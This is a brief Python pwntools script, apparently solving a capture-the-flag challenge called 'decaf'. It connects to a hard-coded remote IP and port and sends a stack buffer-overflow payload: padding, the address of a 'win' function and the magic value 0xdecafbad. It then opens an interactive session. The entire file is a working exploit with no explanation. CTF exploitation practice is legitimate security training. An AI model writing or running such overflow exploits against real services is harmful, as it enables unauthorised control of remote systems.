# coding: utf-8
from pwn import *
pr = remote("207.154.239.148", 1339)
elf = ELF("./decaf")
payload = b''
payload += 36 * b'Z' + p32(elf.sym.win)
payload += 4 * b'Z' + p32(0xdecafbad)
pr.recv()
pr.sendline(payload)
pr.interactive()
